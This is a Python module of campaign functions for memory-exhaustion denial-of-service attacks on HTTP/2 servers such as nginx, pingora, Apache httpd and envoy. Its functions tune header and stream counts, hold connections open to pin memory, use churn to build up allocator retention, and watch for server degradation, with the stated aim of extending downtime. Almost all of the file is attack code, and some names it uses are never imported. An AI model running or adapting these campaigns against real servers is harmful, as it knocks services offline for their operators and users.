"""Churn, OOM, pipelined and sustained campaigns."""
from __future__ import annotations

import os
import subprocess
import sys
import threading
import time

from attack_config import AttackConfig, profile_churn, profile_efficiency, profile_sustain
from attack_runner import run_attack
from paths import BENCH_DIR, DEFAULT_PORT, CSV_PATH, LOG_DIR
from probe import monitor_during, probe_server
from tunnel_runner import popen as tunnel_popen

def run_optimized_single_client_oom(host: str, cycles: int = 25) -> None:
    """
    Efficiency profile: 4096 headers × 256 streams, 80 conn/cycle, hard_hold 12s drip.
    Churn cycles stack glibc retention; hard_hold pins active allocations.
    """
    cfg = profile_efficiency()
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=65,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
        bomb_mode="sequential",
        conn_stagger_sec=0.015,
    )
    print("=== OPTIMIZED SINGLE-CLIENT OOM (v2) ===")
    print(f"Target: {host}")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. RAM/cycle @80 conn: {cfg.est_server_mb_per_conn() * 80:.0f} MiB\n")

    degraded_streak = 0
    for c in range(cycles):
        print(f"--- Cycle {c + 1}/{cycles} ---")
        r = run_attack(
            f"opt_oom_v2_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=80,
            cfg=cfg,
            notes=f"optimized v2 cycle {c + 1}",
        )
        if r and (r.server_down or (r.probe_after.http_code or 0) >= 500 or (r.probe_after.latency_sec or 0) > 5):
            degraded_streak += 1
            print(f">>> Degraded (streak={degraded_streak}) <<<")
        else:
            degraded_streak = max(0, degraded_streak - 1)
        time.sleep(0.8 if degraded_streak else 1.5)

    print(f"\n=== OPTIMIZED OOM COMPLETE — logs: {CSV_PATH} ===")


def run_churn(host: str, cycles: int = 40, connections: int = 45) -> None:
    """Fire-and-forget + multi-wave: max allocation churn, minimal client wire."""
    cfg = profile_churn()
    print("=== CHURN MODE (fire-and-forget + 2 waves/conn) ===")
    print(f"Config: {cfg.to_extra()}\n")

    for c in range(cycles):
        print(f"--- Churn {c + 1}/{cycles} ---")
        run_attack(
            f"churn_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=connections,
            cfg=cfg,
        )
        time.sleep(0.4)

    p = probe_server(host, timeout=20)
    print(f"Post-churn probe: code={p.http_code} lat={p.latency_sec}s ok={p.ok}")


def run_apex(
    host: str,
    connections: int = 55,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """Apex: 64×2 waves, batched bombs, respects nginx 128-stream limit."""
    if variant == "pingora":
        cfg = profile_apex_pingora()
    else:
        cfg = profile_apex()
    print(f"=== APEX MODE ({variant}) ===")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. wire: {cfg.wire_bytes_per_conn() * connections / 1024 / 1024:.0f} MB")
    print(f"Est. server RAM: {cfg.est_server_mb_per_conn() * connections:.0f} MiB\n")
    return run_attack("apex", host, port, connections, cfg=cfg, variant=variant)


def run_apex_scaled(
    host: str,
    connections: int = 100,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """Scale to N conn with ~2 MB wire each — batched parallel, 128 streams/conn."""
    cfg = profile_apex_scaled(connections)
    print(f"=== APEX SCALED ({variant}, {connections} conn) ===")
    print(f"Config: {cfg.to_extra()}")
    print(f"Est. wire: {cfg.wire_bytes_per_conn() * connections / 1024 / 1024:.0f} MB")
    print(f"Est. server RAM: {cfg.est_server_mb_per_conn() * connections:.0f} MiB\n")
    return run_attack("apex_scaled", host, port, connections, cfg=cfg, variant=variant)


def run_apex_multiprocess(
    host: str,
    connections: int = 100,
    port: int = DEFAULT_PORT,
    variant: str = "nginx",
) -> RunResult:
    """One process per connection — bypasses thread/GIL write contention."""
    cfg = profile_apex_scaled(connections)
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=cfg.hold,
        drip=cfg.drip,
        hold_mode=cfg.hold_mode,
        waves_per_conn=1,
        bomb_mode="sequential",
    )
    print(f"=== APEX MULTIPROCESS ({variant}) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_multiprocess(
        host, connections, hold=cfg.hold, stagger=0.25, cfg=cfg, port=port,
        strategy=f"apex_mp_{connections}", variant=variant,
    )


def run_apex_cookie(
    host: str,
    connections: int = 44,
    port: int = 10080,
    variant: str = "httpd",
) -> RunResult:
    cfg = profile_apex_cookie_httpd() if variant == "httpd" else profile_apex_cookie_envoy()
    print(f"=== APEX COOKIE ({variant}) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_cookie_attack(f"apex_cookie_{variant}", host, port, connections, cfg, variant_id=variant)


def run_apex_cookie_scaled(
    host: str,
    connections: int = 44,
    port: int | None = None,
    variant: str = "httpd",
) -> RunResult:
    spec = get_variant(variant)
    port = port or spec.default_port
    cfg = profile_apex_cookie_scaled(variant, connections)
    print(f"=== APEX COOKIE SCALED ({variant}, {connections} conn) ===")
    print(f"Config: {cfg.to_extra()}\n")
    return run_cookie_attack(
        f"apex_cookie_scaled_{variant}", host, port, connections, cfg, variant_id=variant
    )


def run_apex_cookie_multiprocess(
    host: str,
    connections: int = 44,
    port: int | None = None,
    variant: str = "httpd",
) -> RunResult:
    spec = get_variant(variant)
    port = port or spec.default_port
    cfg = profile_apex_cookie_scaled(variant, connections)
    print(f"=== APEX COOKIE MP ({variant}) ===\n")
    return run_cookie_multiprocess(
        host, connections, port, cfg, variant, strategy=f"apex_cookie_mp_{connections}"
    )


def run_pipelined_sustain(host: str, holders: int = 15, churn_cycles: int = 12) -> None:
    """
    Background hard-hold workers + foreground churn waves.
    Extends downtime: holders pin memory while churn adds glibc retention.
    """
    cfg_hold = profile_sustain()
    cfg_hold = AttackConfig(
        streams=128,
        headers=12000,
        hold=900,
        drip=10,
        hold_mode="hard_hold",
        waves_per_conn=1,
    )
    cfg_churn = profile_churn()

    print("=== PIPELINED SUSTAIN ===")
    print(f"Holders: {holders} | Churn cycles: {churn_cycles}")

    py = sys.executable
    worker = BENCH_DIR / "single_conn_worker.py"
    log_dir = LOG_DIR / f"pipelined_{int(time.time())}"
    log_dir.mkdir(parents=True, exist_ok=True)
    procs: list[subprocess.Popen] = []

    for i in range(holders):
        lp = log_dir / f"holder_{i}.log"
        p = tunnel_popen(
            [py, str(worker), "--host", host, "--conn-id", str(i),
             "--streams", str(cfg_hold.streams), "--headers", str(cfg_hold.headers),
             "--hold", str(cfg_hold.hold), "--drip", str(cfg_hold.drip),
             "--hold-mode", "hard_hold"],
            stdout=lp.open("w"),
            stderr=subprocess.STDOUT,
        )
        procs.append(p)
        time.sleep(0.3)

    stop = threading.Event()
    samples: list[ServerProbe] = []
    mon = threading.Thread(target=monitor_during, args=(host, stop, samples, 5.0), daemon=True)
    mon.start()

    for c in range(churn_cycles):
        run_attack(
            f"pipelined_churn_{c + 1}",
            host,
            DEFAULT_PORT,
            connections=40,
            cfg=cfg_churn,
        )
        time.sleep(0.5)

    stop.set()
    mon.join(timeout=3)
    probe_after = probe_server(host, timeout=20)
    fails = sum(1 for s in samples if not s.ok)
    print(f"Pipelined done: probe_failures={fails}/{len(samples)} after={probe_after.http_code} lat={probe_after.latency_sec}")
    print(f"Holder logs: {log_dir} ({sum(1 for p in procs if p.poll() is None)} still running)")


def run_sustained(host: str, connections: int = 40, cycles: int = 10, hold: int = 10, drip: int = 5) -> None:
    cfg = profile_efficiency()
    cfg = AttackConfig(
        streams=cfg.streams,
        headers=cfg.headers,
        hold=hold,
        drip=drip,
        hold_mode="hard_hold",
    )
    for c in range(cycles):
        run_attack(f"sustained_{c + 1}", host, DEFAULT_PORT, connections, cfg=cfg)
        time.sleep(1)